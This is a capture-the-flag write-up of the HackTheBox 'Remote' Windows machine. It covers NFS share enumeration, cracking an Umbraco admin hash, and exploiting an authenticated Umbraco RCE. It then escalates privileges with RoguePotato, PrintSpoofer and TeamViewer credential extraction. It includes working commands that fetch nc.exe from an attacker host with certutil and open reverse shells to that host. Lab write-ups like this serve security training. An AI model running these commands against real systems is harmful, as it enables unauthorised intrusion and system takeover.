---
title: "HackTheBox - Remote"
author: Nasrallah
description: ""
date: 2023-04-09 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, privileges, metasploit, cve, rce]
img_path: /assets/img/hackthebox/machines/remote
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Remote](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.180                                                                                                                     [53/164]
Host is up, received echo-reply ttl 127 (0.22s latency).                                                                                                      
Scanned at 2023-04-04 12:22:29 +00 for 91s                                                                                                                    
                                                                                                                                                              
PORT      STATE SERVICE       REASON          VERSION                                                                                                         
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd                                                                                                  
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                        
| ftp-syst:                                                                                                                                                   
|_  SYST: Windows_NT                                                                                                                                          
80/tcp    open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                         
| http-methods:                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                  
|_http-title: Home - Acme Widgets                                                                                                                             
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)                                                                                               
| rpcinfo:                                                                                                                                                    
|   program version    port/proto  service                                                                                                                    
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                    
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                                    
|   100000  2,3,4        111/udp   rpcbind                                                                                                                    
|   100000  2,3,4        111/udp6  rpcbind                                                                                                                    
|   100003  2,3         2049/udp   nfs                                                                                                                        
|   100003  2,3         2049/udp6  nfs                                                                                                                        
|   100003  2,3,4       2049/tcp   nfs                                                                                                                        
|   100003  2,3,4       2049/tcp6  nfs                                                                                                                        
|   100005  1,2,3       2049/tcp   mountd                                                                                                                     
|   100005  1,2,3       2049/tcp6  mountd                                                                                                                     
|   100005  1,2,3       2049/udp   mountd                                                                                                                     
|   100005  1,2,3       2049/udp6  mountd                                                                                                                     
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                                   
|   100024  1           2049/tcp   status                                                                                                                     
|   100024  1           2049/tcp6  status                                                                                                                     
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                   [17/164]
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17226/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56771/udp): CLEAN (Timeout)
|   Check 4 (port 15893/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-04-04T12:23:32
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

We found an ftp server on port 21 with anonymous login enabled, an IIS http server on port 80, SMB on port 445 and NFS on port 2049 and winrm on 5985. The other port are windows ports not really helpful to us.

## FTP

Let's check the ftp server.

```terminal
$ ftp 10.10.10.180                                                                                                                                 130 ⨯
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:sirius): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> 
```

Connected to the server but couldn't find anything.

## SMB

Let's try listing shares

```terminal
$ crackmapexec smb 10.10.10.180 --shares -u anonymous -p ''
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [-] remote\anonymous: STATUS_LOGON_FAILURE 
```

Couldn't list any shares.

## Web

Let's navigate to the web page.

![](1.png)

The site is called `ACME Widget`, nothing interesting except for the `Contact` Tab where we find an interesting link.

![](2.png)

Clicking on the link redirects us to a login page.

![](3.png)

This is an Umbraco login form, i tried some default credentials but wasn't successful.

## NFS

Let's check if there is any available nfs shares.

```terminal
$ sudo showmount -e 10.10.10.180                                                                                                                   130 ⨯
Export list for 10.10.10.180:
/site_backups (everyone)
```

We found a share called `site_backups` and it accessible by everyone.

Let's mount the share and see what we can find.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/remote]
└──╼ $ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/remote                                  
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/remote]
└──╼ $ cd /mnt/remote                                           
                                                                                                                                                              
┌─[sirius@ParrotOS]─[/mnt/remote]
└──╼ $ ls -al
total 119
drwx------ 2 nobody 4294967294  4096 Feb 23  2020 .
drwxr-xr-x 1 root   root          26 Apr  4 12:24 ..
drwx------ 2 nobody 4294967294    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Data
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody 4294967294    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 20  2020 bin
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Config
drwx------ 2 nobody 4294967294    64 Feb 20  2020 css
-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Media
drwx------ 2 nobody 4294967294    64 Feb 20  2020 scripts
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Views
-rwx------ 1 nobody 4294967294 28539 Feb 20  2020 Web.config
```

As the name suggests, we find the website files.

Let's search for Umbraco credentials in the App_Data folder.

![](4.png)

On `Umbraco.sdf` file we manage to find the admin hash.

## Hashcat

The hash found in a SHA1, so using hashcat mode 100, let's crack the hash.

```terminal
$ hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt               
hashcat (v6.1.1) starting...
                                       
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2727/2791 MB (1024 MB allocatable), 4MCU
                                           
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
Time.Started.....: Wed Apr  5 14:54:49 2023 (7 secs)
Time.Estimated...: Wed Apr  5 14:54:56 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1507.7 kH/s (0.91ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9826304/14344385 (68.50%)
Rejected.........: 0/9826304 (0.00%)
Restore.Point....: 9822208/14344385 (68.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: badboi56 -> bacano1106

```

We got the admin's passwords, now let's go back the Umbraco and log in.

![](5.png)

We couldn't login as `admin` but we were successful with `admin@htb.local`

# **Foothold**

## Searchsploit

Searching for Umbraco in `searchsploit` we find it's vulnerable to an authenticated remote code execution.

```terminal
$ searchsploit Umbraco                 
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                         | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                  | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                     | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                  | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                                            | aspx/webapps/50462.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's copy the exploit `aspx/webapps/49488.py`.

```terminal
$ searchsploit -m aspx/webapps/49488.py                                              
  Exploit: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49488
     Path: /usr/share/exploitdb/exploits/aspx/webapps/49488.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/sirius/CTF/HTB/Machines/remote/49488.py
```

Let's test the exploit.

```terminal
$ python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c whoami
iis apppool\defaultapppool
```

Great! We got command execution.

## Reverse shell

Let's get a reverse shell.

First we upload a copy of netcat to the target using this command

```bash
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a 'certutil -urlcache -f http://10.10.17.90/nc.exe C:/Windows/Temp/nc.exe'
```

Now we setup a listener then tell netcat to connect to us and executing cmd.exe

```bash
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a 'C:/Windows/Temp/nc.exe 10.10.17.90 9001 -e cmd.exe'
```

![](6.png)

# **Privilege Escalation**

## RoguePotato

Let's check our privileges.

```terminal
C:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\windows\system32\inetsrv>
```

We see that we have the `SeImpersonatePrivilege` privilege.

To exploit this privilege we'll be using [RoguePotato](https://github.com/antonioCoco/RoguePotato).

We upload RoguePotato.exe to the target.

```bash
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a 'certutil -urlcache -f http://10.10.17.90/RoguePotato.exe C:/Windows/Temp/RoguePotato.exe'
```

Then we setup a network redirector with socat on the attacker machine using the following command

```bash
socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
```

Now we setup a listener and run the following command on the target system that's gonna utilize the nc.exe to sends us another shell.

```bash
RoguePotato.exe -r 10.10.17.90 -e "C:\Windows\Temp\nc.exe 10.10.17.90 3001 -e cmd.exe" -l 9999
```

![](7.png)

Now back to our listener we should see a shell as System

![](8.png)

For a better understanding of the exploit check this video by `HackerSploit`: [TOken Impersonation With RoguePotato](https://www.youtube.com/watch?v=j0bh6aG1VC4)

## PrintSpoofer

One other privilege we see is `SeAssignPrimaryTokenPrivilege`.

To exploit that we can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

We upload the executable to the target and run the following command.

```bash
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 10.10.17.90 9002 -e cmd.exe" -i
```

![](9.png)

## Intended Way

After running winpeas we find that TeamViewer is listening on a local port.

![](10.png)

Checking TeamViewer directory on `Program File (x86)` we find it's version 7.

![](11.png)

This version is vulnerable to `Local Credentials Disclosure`. The passwords are encrypted with `AES-128-CBC` with known `key` and `iv`, for more information check this [article](https://whynotsecurity.com/blog/teamviewer/)

To get clear text password we first get a meterpreter shell then use the module `post/windows/gather/credentials/teamviewer_passwords`.

![](12.png)

We got a password, now let's see if it's the same one the Administrator uses by logging in via `winrm`

![](13.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).